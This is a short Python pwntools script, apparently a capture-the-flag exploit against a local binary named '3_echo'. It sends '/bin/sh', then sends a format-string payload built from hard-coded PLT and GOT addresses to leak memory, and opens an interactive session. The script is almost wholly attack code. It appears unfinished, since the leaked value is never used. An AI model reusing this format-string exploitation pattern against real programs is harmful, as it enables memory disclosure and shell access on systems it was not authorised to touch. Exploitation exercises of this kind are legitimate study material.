#!/usr/bin/python
from pwn import *

def main():
	p = process("./3_echo")

	print_PLT = 0x8048400
	print_GOT = 0x804a010
	cmd = "/bin/sh"
	time = 0.2

	p.sendline(cmd)
	p.recvrepeat(time)
	p.sendline("1")

	leak = p32(print_PLT) + "%57$p" 
	p.sendline(leak)
	p.recvrepeat(time)
	p.sendline("1")
	
	p.interactive()

if __name__ == "__main__":
	main()
